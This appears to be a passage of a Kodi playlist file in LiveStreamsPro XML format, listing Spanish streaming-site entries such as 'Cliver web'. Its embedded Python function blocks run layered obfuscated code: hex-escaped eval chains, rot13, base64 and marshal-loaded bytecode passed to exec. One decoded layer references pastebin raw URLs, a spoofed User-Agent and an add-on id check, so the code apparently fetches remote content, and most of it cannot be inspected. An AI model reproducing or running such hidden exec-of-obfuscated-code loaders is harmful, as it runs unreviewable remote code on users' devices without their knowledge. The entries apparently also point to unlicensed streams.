MoJV5LHDeY0AuX0x4LF8lqmynLKDiZUx4rP8iA0qcBSEIHJjepv8iDxbmoF8iBJSkAmWInF9uBQVep1RiZaIeJHRiGyqiBKViGQ0aQDc6nJ9hVQ0tW1k4AmWprQMzKUt3ASk4ZmSprQZmWj0XozIiVQ0tMKMuoPtaKUt2Zyk4AwyprQMyKUt2ZIk4AmAprQLmKUt2BIk4AwyprQWyKUt3AIk4AzIprQL4KUt2AIk4AmuprQMwKUt2BIk4AwMprQp5KUtlBSk4AzEprQMzKUt3Zyk4AmOprQL4KUt2AIk4AmIprQpmKUtlBIk4ZwNaXFNeVTI2LJjbW1k4AwAprQMzKUt2ASk4AwIprQLmKUt3Z1k4ZzIprQL0KUt2AIk4AwAprQMzKUt2ASk4AwIprQV4KUt3ASk4AmWprQL5KUt2MIk4AwyprQp0KUt3BIk4ZzAprQVjKUt3LIk4AwyprQMzKUt2MIk4ZwxaXFNeVTI2LJjbW1k4AwWprQL5KUt2MIk4AwSprQpmKUt2Z1k4AwyprQL5KUtlMIk4AmIprQMyKUt2BSk4AwIprQp4KUt2L1k4AwyprQL2KUt3BIk4ZwuprQMzKUt3Zyk4AwSprQLmKUt2L1k4AwIprQV5WlxtXlOyqzSfXPqprQLmKUt2Myk4AwEprQL1KUt2Z1k4AmAprQWyKUt2ASk4AwIprQLmKUt2Myk4AwEprQL1KUtlBSk4AzWprQL1KUt3BIk4AzEprQLkKUt2Lyk4AwIprQplKUtlZSk4ZzAprQVjKUt3LIk4AwyprQMzKUt2MIk4ZwxaXD0XMKMuoPuwo21jnJkyXUcfnJVhMTIwo21jpzImpluvLKAyAwDhLwL0MTIwo2EyXTI2LJjbW1k4AzIprQL1KUt2MvpcXFxfWmkmqUWcozp+WljaMKuyLlpcXD=='
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUJRQUFBQU1BQUFCREFBQUFjMEVBQUFCa0FRQmtBQUJzQUFCOUF3QmtBZ0JxQVFCa0F3Q0RBUUI5QkFCa0JBQnFBUUJrQXdDREFRQjlBQUI4QXdCcUFnQjhCQUI4QUFBWGd3RUFhZ01BZ3dBQVV5Z0ZBQUFBVG1uLy8vLy9jeFFBQUFCaFNGSXdZMGhOTmt4NU9XbGhXRkYxWWtoclBYUUdBQUFBWW1GelpUWTBjeUFBQUFCTU1FNTJZbTFXYW1SSE9YbGFXRTVtVVROS2NHTXpVbWhpUlVZMlpGZDNQU2dFQUFBQWRBY0FBQUIxY214c2FXSXlkQVlBQUFCa1pXTnZaR1YwQndBQUFIVnliRzl3Wlc1MEJBQUFBSEpsWVdRb0JRQUFBSFFSQUFBQVR6QlBNRTlQTUU4d01FOVBNREF3VHpCMEVRQUFBRTlQVDA4d1QwOVBNRTh3VHpCUE1FOHdkQkVBQUFCUFR6QXdNREF3TUU4d1QwOHdUekJQVDFJQkFBQUFkQkVBQUFCUE1FOVBUekF3TUU5UE1EQXdUMDlQTUNnQUFBQUFLQUFBQUFCekJnQUFBSE5qY21sd2RIUU1BQUFBUjJWMFRGTlFjbTlFWVhSaEFRQUFBSE1JQUFBQUFBRU1BUThCRHdGT0tBRUFBQUJTQ1FBQUFDZ0FBQUFBS0FBQUFBQW9BQUFBQUhNR0FBQUFjMk55YVhCMGRBZ0FBQUE4Ylc5a2RXeGxQZ0VBQUFCekFBQUFBQT09IikpKQ=="))
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNBQUFBQVlBQUFCREFBQUFjL1FBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0JrQWdCOEJ3QnFCUUNEQUFCcUJnQmtBd0NEQVFCckJnQnlnUUI4QkFCcUJ3QmtCQUJrQlFCcEFnQmtCZ0JrQndBMlpBZ0FaQWtBTm1RS0FIUUlBSU1CQW1vSkFGTmtDd0I4QndCcUJRQ0RBQUJxQmdCa0F3Q0RBUUJyQmdCeXhnQjhCQUJxQndCa0JBQmtCUUJwQWdCa0JnQmtCd0EyWkFnQVpBa0FObVFLQUhRSUFJTUJBbW9KQUZOOEJBQnFCd0JrREFCa0JRQnBBZ0JrQmdCa0J3QTJaQWdBWkFrQU5tUUtBSFFJQUlNQkFtb0pBRk5rQUFCVEtBMEFBQUJPYWYvLy8vOTBDd0FBQUdOeWFYTjBZV3hoZW5Wc2RBSUFBQUJwWkhNaEFBQUFhSFIwY0hNNkx5OXdZWE4wWldKcGJpNWpiMjB2Y21GM0wycFFXbUZDUjFsT2RBY0FBQUJvWldGa1pYSnpjMGdBQUFCTmIzcHBiR3hoTHpVdU1DQW9WMmx1Wkc5M2N5Qk9WQ0EyTGpNN0lGZFBWelkwT3lCeWRqbzFOUzR3S1NCSFpXTnJieTh5TURFd01ERXdNU0JHYVhKbFptOTRMelUxTGpCekNnQUFBRlZ6WlhJdFFXZGxiblJ6RkFBQUFHaDBkSEJ6T2k4dmNHRnpkR1ZpYVc0dVkyOXRkQWNBQUFCU1pXWmxjbVZ5ZEFZQUFBQjJaWEpwWm5sMEJRQUFBR1psYzNSaGN5RUFBQUJvZEhSd2N6b3ZMM0JoYzNSbFltbHVMbU52YlM5eVlYY3ZSalJvZG1KcGVIa29DZ0FBQUhRQ0FBQUFjbVYwQ0FBQUFISmxjWFZsYzNSemRBSUFBQUJ2YzNRRUFBQUFlR0p0WTNRSkFBQUFlR0p0WTJGa1pHOXVkQVVBQUFCQlpHUnZiblFNQUFBQVoyVjBRV1JrYjI1SmJtWnZkQU1BQUFCblpYUjBCUUFBQUVaaGJITmxkQVFBQUFCMFpYaDBLQWdBQUFCMEVRQUFBRTh3VHpCUE1EQXdUekF3TURCUE1FOHdkQkVBQUFCUE1FOVBUekF3VHpBd1R6QXdUekJQVDNRUkFBQUFUMDlQVHpCUE1EQlBUMDlQTUU4d1R6QlNCZ0FBQUZJSEFBQUFVZ2dBQUFCU0NRQUFBRklLQUFBQUtBQUFBQUFvQUFBQUFITUdBQUFBYzJOeWFYQjBkQXdBQUFCSFpYUk1VMUJ5YjBSaGRHRUJBQUFBY3d3QUFBQUFBVHdCR3dFcUFSc0JLZ0pPS0FFQUFBQlNFd0FBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/QBdkMFK.jpg</thumbnail>
<fanart>https://i.imgur.com/YJvk7cD.jpg</fanart>
</item>









<!--
<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Dilo [COLOR white]web[/COLOR]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/QBdkMFK.jpg</thumbnail>
<fanart>https://i.imgur.com/YJvk7cD.jpg</fanart>
<externallink>https://pastebin.com/raw/F5vkjmcF$$LSProEncKey= $$</externallink>
</item>
-->





<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Cliver [COLOR white]web[/COLOR]</title>
<link>$doregex[A]</link>
<regex>
<name>A</name>
<listrepeat><![CDATA[
<title>[COLOR gold]*[COLOR lightsalmon]Cliver [COLOR white][A.param1] [/COLOR]</title>
<thumbnail>https://i.imgur.com/m6YPUYA.jpg</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
<link>$doregex[busca]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction


import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MDB3b0FBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFVlROT1JGa3lXa1JWZDAxNlVUSlphbGsxVFhwSk1rNXFXVFZOYlVrelRVUktiVTV0U1RCYVZGSm9UWHBuZWsxVVVUQk9hbEY2VG1wak1FNXFTVEJQVkZGNlRYcG5lazVxWTNkT2JVMHdXV3BaZUU1NldUQk9hbEpvVGxSTk1GcFVVVEpPZW1jelQxUlZlRTVIVlRKWlZGbDVUbXBqTVU1VVVtcE5iVWt3VFZSUk5VNVVSVEJPVkdNeVRsUnJNRTU2V1RCT1JFbDZUV3BhYlUxNlZUSk9hbFYzVFhwcmVrOUVVbWhPUjFFelRXcFNhMDVVWnpKWlZGbDRUWHBqTTA1VVl6Tk5la1V4VGxSU2FFNUhXVEpPVkUxM1RYcFJNazE2V1RKT2Fra3lXWHBTYlUxdFdURk9lbFYzVGtkTmVWcHFZekJPTWtVeVRtcGpNRTV0VlROT1JGa3dUWHBGZVZscVRYbE9lbU41V1dwWk1FNVVRWGxhYWtwdFRtcGpNMDlVVlhwT2FsRXpXVlJWZDA1dFZUTlpWRTB4VFcxWk1GcHFZekJPVkdjd1dsUk5NVTVxVlRGUFJFMHlUbGRGTWsxcVl6Sk5lbFV6VFhwVk5FMTZaekZQVkVwdFRtcFpNMDFVVVRKT1Iwa3hUVVJSTlU1cVdUSmFWR1JvVFcxWk1VNXFXbXBOZWxVeVRtcGFhMDU2VlRCWmVrcHRUWHByZVZscVZYZE9SMDB5VFdwYWFrMTZXWGxhYWtwcFRrZFJNRmxxVFRKTmVrbDZUMVJaTVU1Nlp6Rk9hbU14VGtkUk0wNXFWWHBPYWxFelRucFZkMDVIVFRKWlZGazFUWHBaTUU1cVRUTk5lbEV5VG5wTmQwMTZZek5OYWxWNlRucEJNRTlFVlRCT1ZHY3dXbFJaTUU1dFJYcE5WRXBwVGpKRk1rMTZTbTFPVkVrd1QxUlplRTU2VFRKYVZGVXhUbXByTVUxNlZtaE9SRmt5V2xSTk1FNXFXVEZOUkUxNVRqSkZNazVFVFRKT2JWa3hUV3BhYkU1NlRURk9SRlUwVG1wck1GbHFXbWhPVkVGNlRsUlJNRTE2YXpOUFJHTjVUbnBSTWxsVVdtaE9WRUV5V1ZSU2FVNTZTVEJOYWxwc1RtcFZNMDVxVlROT1JGRXdXWHBqZUU1SFZUTk9WRTAxVGxSUk0xbFVXVE5PVkZGNlRYcE5NazE2VFhwTmVsSnNUbTFGTWxsNlkzcE9WRkV3VDBSYWEwNVVUVE5aVkZKc1RtMVJNVmxVVFhkT2FrVXpUWHBOTVU1NlFUQlplbFUwVG5wRk1VNUVXVEJPZWtrd1drUk5NMDV0U1RGT1JGRXpUbXBKTWxwRVVtcE9SMWt3VDBSUk0wNTZTVEJPVkZrMFRrZFZNVTlFWXpKT2VrMHlXa1JqTUU1Nll6QmFhbGw2VGtkUk1sbHFUWGRPYlVreVRYcFZOVTVFV1hwTmVsSnRUbFJWZVZscVdUVk9hbGt5V2tSVk5VMTZVVEphYWxKclRYcG5lazFVVFhwT1IxVXhUbXBhYkU1cVp6Rk5lbGswVG0xVk0wMXFZM2hPUjFVelQwUmFhMDVVWXpKYVJFMHdUbnBCZWs5RVRYcE9lbEV4VGtSU2FFMXRXVEJaVkZVeVRrZFJlazVxVVRWT1ZGRXpUVVJaZVUxNlVUSlplbU15VGxSck0xbFVXbXBOZWtrelRsUlplazE2VlRCTmFsVXhUa1JuTWsxcVZtaE5lbFV6VG5wWmVFMTZSVEpOYWxwcFRsZEZNMDFFV1hsT2FtTXpUV3BhYlU1VVJUSk5lbU14VG5wVk1rNVVXbXRPVkdNeVdYcFplRTVFUlhwTmVscHBUWHBqTTA5RVZYZE9hbFY2VDFSYWJFNVVTVEpOVkZWNFRucEJNazVxVlROT2VtY3pUbFJrYUU1cVl6SmFhbU14VGtSck1VNVVTbTFPUjAweFdWUlNiRTE2VlROUFJGcHJUbFJWTUZwRVdUSk5lazB6VGxSUk5FNXFUWHBPVkZFeFRsUm5NVTU2VFhkTmJWa3pUWHBqZWs1Nll6Rk9SRmt4VGtkRk1rNXFUWGRPYlZreVRsUlNhMDE2UVRGTmVsVjZUbTFGZWsxcVZUVk9lbFV5VGtSUmVrNXFhekZPZWxWNVRXMUpNazlFWXpCT01rVXlUMFJWZDA1VWF6Slpla3B0VG1wak1FNTZWVEJOZWxFd1dWUk5NazV0VFRKWlZGRjRUbXBSTWs1cVVtMU9WR2N3V2tSVmQwNXFZek5QVkZrMVRtcHJNRTFVWXpKT1ZFMHhUMVJOZVU1cVNUQk9SRnBvVG1wck1GbHFVVFJPVkdjeFRsUmpNazV0V1RKWmVrMHdUa1JWTVU1RVRYbE9WRlV6VG1wS2FVMTZVVEJhYWxGNFRrUlJNRnBxVlhsT1IwMHlXbFJTYWs1NldUSlphbHBxVGtkVmVWbHFUVE5PZW1zeVRucFpORTVIVlhwUFJGRjRUWHBWZWs1RVkzZE9iVlV5VFhwak1VMTZWVEJaZWxWNlRucEpNMDU2VVRSTmVtTXdUMVJaTlU1NlVYcE9hbEY0VG0xVk1rMXFVbXRPZWtFd1RXcFJlazR5UlROT2FtTTBUbTFWTVU1VVkzcE9SR2N5VG1wWk5FNUVUVEphVkZwclRsUlplazE2VVhwT1IwMHlXVlJOTTA1cWF6Tk5lbHB0VGxSSk1rNXFWVFZPYWtrd1dtcFplVTE2VVRGWlZHTTBUWHBOTTA1cVVtdE5lbU15VG5wVk1rMTZaekZOYWxGNlRXMUpNazU2V1hsTmVtY3dXa1JhYlU1SFJYbFphbFY2VG0xVmVWcHFVVFZPYlZreVRtcFpNMDVVVlhwUFJGRjZUa1JuTUU1cVdtMU5lbFY1V1dwak1FMTZVVEJPZWtwcFRucHJNRTE2VFhwT1JHc3dUbXBqTkU1VVRUTk9hbEpvVFhwck1rMXFXbWxPYWxFeFRtcE5NMDVIVVhwT2Fsa3pUbTFGTTA5RVZYbE9WRVV6VDBSTk0wMTZaekJOYWxKcVRYcE5NazU2VlRCTmVtc3lUbnBOZWs1dFNUQk9SRTAxVG1wbk1rOVVTbTFPUkdzd1dsUk5NMDVIUlRCYWFtUm9UWHBKTWxscVVUTk9lazB6VG5wUmVVMXRXWGxaYWswd1RrZEZNRmw2VFhkT01rVXhUWHBWTkUxNlp6QmFhbEpyVG5wbk1sbHFVWGxPUjAxNlRYcGpORTE2VFRGT1JFMHlUbFJGTWsxcVZUVk9hbWQ1V21wWmVFNXRXVEJaZWxreVRsUk5NazVxV214T1ZGVXdXVlJqZVUxNlVYbFphbU0xVGxSck1rMTZUVFJOZW1jeVdsUlpNRTVIVVhwT2VrMHpUbnBKZWs1cVkzbE9lbGt4VFZSVmVVNVVTWHBPUkZwdFRYcGpNVTlVWXpKT2FrVXpUbFJSTkUxdFNUQlphbFY1VGxSVk0wNUVZelZPYW1ONVdtcGpNMDVFV1hwT2FsVjRUbnBKZWs1NldUUk9hbU13VG1wTk5FNUVWVEpPVkdNMFRrUm5NMDFxVW1oT1IwbDZUbXBWZUU1VVFYcE5WR04zVGtSak1GcHFZekZPUkZWNlRucE5NRTV0VVhsYWFsSnRUbTFKTUU1VVNtbE5lbEV3VFZSS2JVNTZXVE5OUkZFMFRsUm5NbHBFVVRGTmJVa3dXa1JSZVU1VVFYcE5SRkpxVG5wVk1sbHFVWHBPUkZVeVQwUmFhazVxWjNwT1JHTjRUbnBaTWs1cVRUUk5lbWN3VDBSUk1rNVVWVEpOZWxVeVRsUlJlazlFV20xT2JVVjZUbFJSZVU1VVp6TlBSRmt6VG5wbmVrMVVUWGxPYWtreVdrUlZlazVVVlROT1JFMDBUbXByTVU1cVl6Rk9WRVY2VFVSTk0wNXRTVEpPZWxwb1RucFpNMDlVVW1wT2FsVXhUbXBSZUUxdFdUTk9hbFY2VGtSRk1rNXFZM2xPUkVVeldWUk5NVTVFVlRCT2FsVTBUbXBOTUU1VVdteE9SR016VFVSUk1rNUhWWHBPUkZFeFRrZFZlazVVVVhwT1IwMTZUWHBhYUUxNlFYcFBWRTE2VG5wVk1rOVVVVFJPUjBVeVRsUlJNVTR5UlRKTmFtTTFUa1JOTUU5RVdtbE9la1V5VDFSYWEwNTZaekJPVkZreVRtMU5NRmw2VFRGT1JFMTZUbnBOZUU1RVdUSk9lbFV5VG1wak1VNVVZM3BPUjBVeVRtcE5ORTVVUlhwTmVrMHdUbTFaZWs1RVZYZE9lazB3VGxSTk5FNXFSVEZPVkUweVRsUk5NRTFxWXpOT2JVVXdUMVJOZUU1NlJURk9hbEpzVFhwVk1VMVVZM2xPUkZFelRsUlJOVTVIUlRKT2FtTTFUbFJWTWxsNlRUTk9SMUV3VDBSTk5VNTZaekJPVkZFelRYcG5NRTVVVVhsTmJWa3lXbXBTYlU1cVJUSk9SRTAwVG5wRk1FOUVVVEpPZWxVeFRsUk5NMDE2VVhwT1ZFMDBUa1JKTVUxRVZUUk9WRlV3VDBSWk1rNUVhekZPYWswMFRsUkZNMDVFWXpOT1ZHZDZUVVJOTTAxNlJYcE9hbEV4VFhwTmVWbHFVWHBPUjFVeVRtcFNhRTVVYXpCYVJGSnJUbnByTUZsNlVUSk9SMFV3V2xSTk5FNXFhekZOYWtwcFRrUkZkTk1LQUFCdFFXMWFNMXB0UkRGQlIweHRRWGRFTWtGSFNERmFiVnB0UVVkRU1GcHRVakpOUjBoclFXMU1iVUpSVEROQmVrd3dRVkZNTkVGdFZqTkNVWEYxUVVkYU1rRnRUREpCVVVneVRYZE1NRUYzZURKYWQxbzFRVkZ3TVVGUlJYWmFla3hzVEhkSU1VRlJUREJOVVZkMlFWUldiVUZ0UlhwQlVVUXlUSGRJTkZwdGVERmFSMXBzV20xTU1GcHRTRFJCZWxveFdsRndNa0Z0Y0RCQmQzQXlRVEpTTWtKUldqQkJSMGd6V25kYWJFRkhUREpNZDBWMlFYZE1NMXBIUkRKYWJWcHRRWGRFTlVGdGVETkNVVTE1UVVkTU1WcFJXbTFCZDNneVRFZHdNRUYzY0cxYWQwUnNRVzFJTUUxUlJEVmFlbFp0UWxGRU1VRlJURzFDUjB3elFYcFdiVUZ0VFhkQlIwZ3hRbEZFTTBGUlVqQkNVVWwxUVVkV01FSlJjRzFCVVVnd1FsRkliVUYzUkd4TWQwd3pRWHBFTVVKSFRHeEJkMHd6UVZGSWEwRnRjREphZDFvMFFYcGFNVXhIU0cxYWJVUXdXbTFhYlZwdGRESk5SMW93UVZSU01FMUhSREZCYlhnd1FVZHdNVUYzVEcxQlVVMTNRVlJhTWtKUlJEUkJWRm93VEVkTmRVRnRVakpCYlZkNlFWRjRNMXBSU0RCQmJYUXdRbEZJTkVGSFdqSmFkM0F5UVhkSU1VRkhSWFZhYlV3eFRFZFhka0ZSVWpCTWJVaHFRWHBJTVVGdFJERkJWRXd3UWtkd2JVRlJXakpCZDNBd1FWRldNVUZIU0RSYWJWSXdURzFhYTBGUldqSk1SMXBxUVVkYWJWcFJUWHBhZWt3eVFrZElhMXB0Y0ROYVVVMTRRWGR3YlVGUmNHdEJla2d6UWxGRU1scHRXakZCUjBSclducE1NRXgzU0cxYWVrd3dRa2RNYTBGM1dqQmFSMHcxV20xYU1reHRSWHBhZWt3eFFVZEpkVnB0VWpCYWQwUTBXbTFPYlZwUlJESkJSMUp0UWtkYWJFRjNkREZhUjFkNldtMVdNRXhIV214QmVsWXhRVWR3TUVGSGNETk1SMHcwUVZSYWJVSkhUREJhYlV3eVRWRndNa0Y2VmpCQlVWcHFRWGRNYlZwSGNESkJSMHd5VEcxd05VRkhVakJCVVZvMVFWRmFiVnB0VFhsWGFqQlljVlZYWTI5NmVUQnlSazQ1VmxCd2FVSkdPVkJNUjAxcWNUSkZiVTFMUlZCYVIwbFlSWHBhTkc5aFJYZEdlamxLV2xWalQwMHdhM2xLU2sxb1RIaGpZMFl4ZVUxTlMwMWlRa2c1UVVnd1UycEtlRUZhVFZGSldVMTNVM2hhZW1kS1drcFRkMGd5VWpCS1ZVOUxXa2Q1YUVneFUwWmFVWFZVYm5oclVVcGhVMnh1VW1OTldqQjFaVTFSVFhWS2VFMVJSbnBqTkVFelJYbE5WVTlOUmtkSlUwaFRlVE5HTUdOUFJYZ3hkbkV4ZVVKSlZIbFpUV0Y1YkV4M1R6Rk1kMDlTUmpORmVIQjZjVE5DUjBGWFRWRk5NVWhMY1ZaR1NGZG5RWGx4VWtsUlQycHhTMU51U2xGNVluRlRWMjFGU2pRMFJURkpiRTB3WW1wS1ZVRkRSRE5QTWtwSVJXTklVMWRGY1VsTU5FUmhjVWR4ZDA5cFNYaGpZVVY0T0ROQmVWb3pTVEoxWVhGVmRHVndTRFZaY0VsNVpYRXdaMmx4ZVhFMFNGTkZUMGxKVEROTVNrVllTbnB4U2xodFZqSktZV0pzUlRKbU5VY3lTV1pOTW1Nd1FVcEJUMjlLYTJOd1NGZGFjbEZCVWxreVptcHVNbkZKYjNwSlVVZFJTV2xCTUUxcFFrcDFkVnBUVERGRVNYbG1Ra3RXYkV4NVQyMUZZVmQzUWxKWE1uRXdZbWxKU0ZOalNXMXhiVUpKV214dVMwbEdiekJuWTFreWNXdEVTVUZZUWtoTldFRklZM1phUmprMFFYZEVhVnBKVEd4YVZVODJSMVJyWlc5TFUxbGFTa1ZUV2pONWRscGhTVE52TVhWb2J6TlRhWEo1VFRGYVVEbEpSakl4TmsxNmVVOUJTblV6UmxSMGFYRXlaMkpZTW5WSFFWSk5RVzR3YTJoSlIwRXhTWHBYVEUweVYyeHdTbE5HYjBkd2EwMUtSVkJHTVZOV1RYb3hhVVpKUldaSFUzRlhTbmROTTB4S01VWmFiVUUwYnpCQlRWZ3hZMkZ2VWxkRlNuWm5TMjVWVTFaTVIwMW9SM2x4YVc4eFQxcGFSMGx0VEVneFNFWlVNV3h2ZW5WMlRVcEJObG95VFVKS1ZVRkJiM2RPWlc4eFJXWkNSM0ZyVFRORmJrcDRRVkJCUjBsclNESlRNMGQ2TUd0SVVVeGxXVzE1WkVkVlZ6Tk1lWEZoVEhneGRVSktSVnB2YlZkTFJsSnhhRWxVT1RCdlMySTFURXRCWjBGS2RXdEhSbVp0YmxWTk1raEpVMU51VlU0eWJ6QjFhRXBIVTNsS1IzRlRUREZpTVVaTGRWZHVVbFpzYmxOamFFRXplVUZHUzBrMGNWSnhiSEpWY1hwSlVYUTBSakJFWlV4SVJXVk5NRk5QU1ZORllXOXRlVnBHU0hSc2JrbzRhMEZSVjNoQ1NFRTFRWGhqUkc5TGNVRllNVVZaUlRKclpsb3dNV051VWpsSlRWTmliRWxVU1hWRlUxTnNjRWhyYVhKU1FVZE1kM0V4UlVkME0wMUlZekJZTW5GV1NFcEpVMFZJVFdGSlMzZzFURzFCWjB4SlJYZEVkMEZOY2tablNrbFVlV3hDU1ZNd1NVbDVVa1F6ZVdaSE0wRmpjWGhOU1VZeVNUQmFNREZMU1habmFrZElVakJ3U0ZOSmJ6QkpXSEZJUkdsdVVuVlJSMVJOTUhBelJYVkJVMDAyY0hkRldVZ3laM1Z1VVVGcGNUQm5VbHA2VTBGeE1IRnBSbEZGU2tSMloyRmFNRGxzUjJGd01GbHRVbXhKU25GRlIxUjFOVWgzVXpCTlIwOXBSRXRNTUV3d2VXeEdlakZpVFV0TWJFaDNTV0ZOVTBGSlJWSnhURWRWUVU5TU1GZGxXVEZCWkVoVVJXaGFNR3RoU1hkSlpXOVNPVFZKYlZOaldqQnhNbGt3Y1RaYWJVVlFURWw1Wm5CS01UWmFTMk5oY25samRYQjVRV1Z3ZWpGSGJubEZWSEIzU0RGQlMwbEVXbnBUZFVGS1ZtbHdlVWhzY2xWTU1rUjZWMnhKVlVGWlJuWTVXa1p0VjB0TlMwRmhSMG94UVVGS1lteHhTMU5oY0ROVFYzQnRUVlZ4TTB3MVduaGpVVVJ0VjNWdVUzaHFSREYxTkVFeVNWRmFVM0UxY1VwaVpVZHRSVWh1ZDAweVJrdEJiRVpTVjFoQ1ZIbG5Sa2Q0YVUxdFFYZHdNMWRyU2xORWJVa3ljR2x1ZWpsNFRFZElha1V3TkdWWU1tTmlUVWR4VjNKS1kzaEdkbWROVFhsSVpWcDZVMHBIYlhGVmJ6SlhTbTVMUVRCdU1VRnRSak5NWlc4eVkxTndla0Z1Y0ZJNWRrRkxWMnB4U2xNMlRFbzVZWEZLTUROdU1ubHViMU5CV1c1UmRXRmFVMk5TVFZGNVQwd3pURFJKU25Wa2NuZEpkbTVLWjFaQ1VsZHNRVWxGYmtaSU9YaElVakZuUjIxTldVVXlZbTFOVVZObFFYcG5VSEV3UlVaQ1NHdFdSSGQ1VTI5NVFWQk1TRkl6V2tsUFIwMVRVek55VURsclRFbEJXRzVIZVd0SFMzRlJUSGhuUjB4SVFXVnhNRGw0Y0VwclUwaEhRVWxHTUVWRVdEQlNNVWd3WjJsdVVsTjNibFJGWjAxM2RHcHViWFZzY2t0TldXOTVVMWhGU0dwdFFYZzBiRUpJU1haWmJEbFdXVEZOYVc5NFNWcENVM0ZUV0ROSU0wZEtkVEJLVWpReldubEliWEYzVDFoSVVreHJXbEZOVTI1M2VXWkpTSFZJU1ROd2JVVlVWbXh3TUhWalJYaHFNa3g2TlVaRWJVMW9TVEZGZFc5NVkxRnhTMU5TUkRCWFlXNUxSWGx4VWxJeVFsTkpSVVZLWm14RmVVeHBjWGhyZUVGaGRWQnhkM1JxVEcxMVQxcDVWMGxFTTA5R1JqTkJVa1poVTJ0dVZHSnNSek5TYWtwR2NFRlFlamxzVEVwQlprMUdUamxXVUhBelFrZEpkVnB0U0RCTmQwaHJRVkZFYlVKUldqUkJWRkl4UVcxSWJWcHRSREJCVVhBeVFYcE1NVUZSVERGQmVsb3lURWRNTUZwdFdqSkNSMFJyUVZGME1FMTNjR3RCVkV3eVRVZEZkVUZVVERCYVIwd3lRWGR3TVVGM1dqVkJVVWd4V2xGSmRVRlVUR3hOZDB3elFXMUViVUZIVEROQmVrZ3hRbEZYZGtGUlJHMWFiWEF5UVZGV01VSlJURE5hYlVodFFVZGFiVUYzZERGTVIxcHFRWGRJYkV4M2NHcEJWRnB0UWtkYU1VRjZVakpCZDBRMVFXMVdNbHB0UlhoQlIxWnRXbmRNYlVGSFRqSkNVVWd5V25wTU1rRnRSRzFCZDFveVRHMU1hMXB0UkRKQ1VWb3pRVXBTYlVKUlRERkJkMFF5VFVkTmRscHRVakZNUjFveVdtMU1NbHB0VFhaQmVrZ3pRVzF3YkVGSFRESkJSMGhyUVcxd01FSkhXakJCVVhBeFFWRk1ORUZSUkRGQmJVUnNRWHBTTVVGUlJHdEJiWGd3VFZGSWJFRjZURE5DVVhBelFYZDBNVUZSUkRGQlVWSXdXbTFOZFVGNlZqSkJVVVY1UVhwTU1FSlJXbXhCZDNUVENnQUFhekZPVkZsNlRrUkZNVTlFVFRWT1JHc3lXbXBqTTA1VVRUSlpWRkV5VG1wck1FMTZVWGhPUkZVeFRtcGFhVTVFUlRGWlZHTjNUbXBuTTAxRVVUTk9SR014VGxSU2FFNVVUVEZPYWxGNVRrZFJNRTlVVFhoT1JHTXhUVVJTYVU1RVRUQk9hbEpvVGtSck1rOVVVbXROZWtFeVRWUlpORTV0UlhwT1ZGRXpUa1JyTWxscVVURk9WRkV4VFZSUmVFNUVTVEJOZWxWM1RtMVpNVTFVVVhwT1Ixa3dXVlJqTkU1dFdYbFphbGt3VG1wak1VNUVUVFZPUkdNd1dtcFZlazVFUlRCWmFtTTBUbnBGTUUxcVRYaE9hbWQ2VG1wTk1FNUVWVEJPZW1NelRtMUpNVTE2VFhkT1JHTXlX